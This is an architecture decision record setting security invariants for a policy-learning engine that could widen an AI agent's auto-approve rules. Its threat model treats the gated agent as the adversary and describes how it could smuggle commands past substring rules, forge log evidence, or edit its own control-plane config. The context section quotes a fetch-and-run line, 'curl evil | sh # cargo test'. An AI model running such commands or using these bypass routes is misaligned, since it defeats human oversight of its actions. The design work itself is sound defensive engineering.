# ADR-0005: Policy-learning security invariants

- **Status:** Proposed
- **Date:** 2026-07-03
- **Deciders:** Josef Aguilar (PO), Claude (adversarial spec pass, itr#422)
- **itr:** #422
- **Related:** ADR-0001 (tiered fail posture), ADR-0002 (always-defer classification)

## Context

The policy-learning engine (`docs/plan-policy-learning-engine.md`) mines `decision_log` to
suggest — and, behind an opt-in, auto-apply — auto-approve rules. That makes it the one
mechanism by which policy can widen without a human typing the rule, and its adversary is
the gated agent itself: agents generate the training data, control the free-text fields in
it (commands, paths, agent identity), run as the same OS user as the daemon, and are
optimizing to get tool calls approved. An adversarial pass over the existing plan found
concrete holes: learned rules reusing today's **substring** `allow_patterns` semantics are
trivially smuggleable (`curl evil | sh  # cargo test`); sus classification only at
learn-time misses hostile *inputs* matching clean *patterns*; `events.jsonl` is forgeable
evidence; bulk approvals inflate confidence without per-call judgment; and nothing
prevents learned (or static) rules from pre-approving writes to `~/.wisphive/` itself.

## Decision

Implementation of the learning engine is bound by ten invariants (I1–I10), recorded in
full in the plan's **Security Invariants** section:

1. **I1** — the engine's config write surface is a whitelist: prefix-anchored allow rules
   under `tool_rules.<tool>` only; structurally unable to touch levels, postures,
   always-defer, or deny rules.
2. **I2** — learned rules never use substring semantics; a new anchored rule type
   (`allow_prefix`) matches the parsed first command / canonical path prefix only.
3. **I3** — sus evaluation also runs at **decision time in the hook** (shared crate);
   Caution/Blocked inputs are never resolved by a learned rule; compound commands always
   fall through to human review; `engine_min_version` gates stale hooks out.
4. **I4** — evidence counts only daemon-witnessed, **individually** human-reviewed,
   unredacted decisions (excludes `events.jsonl` ingests and bulk approvals; requires
   `decided_by` to distinguish `human:individual` from `human:bulk`).
5. **I5** — agent identity is non-load-bearing evidence; auto-apply requires
   time-diversity (≥ N distinct days) and is hard-scoped to the projects where evidence
   was observed.
6. **I6** — one human deny of a call a learned rule (would have) auto-approved revokes
   the rule immediately.
7. **I7** — explicit promotion lifecycle (`candidate → suggested → active_human |
   active_auto → revoked`), every transition audit-stamped with evidence snapshot and
   `config_hash`; the audit stream, not `config.json`, is the source of truth.
8. **I8** — rollback is atomic and tombstoned with a re-suggestion cooldown;
   `emergency-off` additionally deactivates all `active_auto` rules.
9. **I9** — `~/.wisphive/**` joins the never-learnable Blocked lists; the standalone
   default-deny hardening for agent writes to `~/.wisphive/` ships **before** the engine.
10. **I10** — the Blocked regex list is documented as a backstop, never as the security
    boundary; the boundary is structural (I1–I3) plus the human monopoly on widening.

A phase that cannot satisfy an invariant blocks until the invariant is renegotiated by a
successor ADR.

## Rationale

Statistical confidence measures frequency, not blast radius; every gate the plan
previously had (thresholds, multi-agent factors, learn-time sus) operated on data the
adversary authors. The invariants move the security boundary onto things the agent cannot
author: which config keys the engine can physically write (I1), match anchoring (I2),
decision-time re-evaluation inside the hook (I3), and evidence provenance the daemon
itself witnessed (I4). The rest bound the damage of a wrong rule (I5–I8) and keep the
control plane out of its own training set (I9).

## Consequences

- Easier: implementers can build phases 1–10 of the plan without re-deriving the threat
  model; reviewers have a checklist; the audit trail (itr#397) gains learned-rule
  provenance for free.
- Harder / costs: a new `allow_prefix` rule type and shell-word parsing in the hook
  (latency-sensitive path); `decided_by` granularity change; the sus evaluator must move
  to a shared crate; auto-apply becomes meaningfully rarer (time-diversity + per-project
  scoping), which is accepted — suggest-mode is the product, auto-mode is a convenience.
- The learning engine is blocked on the `~/.wisphive` default-deny hardening issue (I9).
  **Cleared (itr#425):** the hook now forces agent writes to `~/.wisphive/**` to human review
  (`targets_control_plane`, opt out via `allow_self_modification`); this blocker is resolved.

## Alternatives considered

- **Reuse substring `allow_patterns` for learned rules** — rejected: comment/argument
  smuggling makes any learned substring an auto-approve oracle.
- **Learn-time-only sus classification** — rejected: clean patterns with hostile
  arguments/chaining exploit the gap between pattern and input.
- **Trust `events.jsonl` as evidence** — rejected: appendable by any process running as
  the user, i.e. by the adversary.
- **Threshold-based revocation (e.g. deny rate > 10%)** — rejected for learned-rule
  denies: a human deny is ground truth that the rule mis-scoped; one strike is cheap and
  the rule can be re-earned through fresh confirmation.
- **Hardcoding a bigger Blocked list as the primary defense** — rejected: regex denylists
  are unsound against an adversarial LLM; kept only as a backstop (I10).

## Links

- Plan: `docs/plan-policy-learning-engine.md` (Security Invariants section)
- Code (governed, future): `wisphive_daemon/src/learning.rs`, `wisphive_daemon/src/sus.rs`,
  `wisphive_hook/src/main.rs` (`apply_tool_rules`)
- itr: #422; standalone hardening issue filed from I9
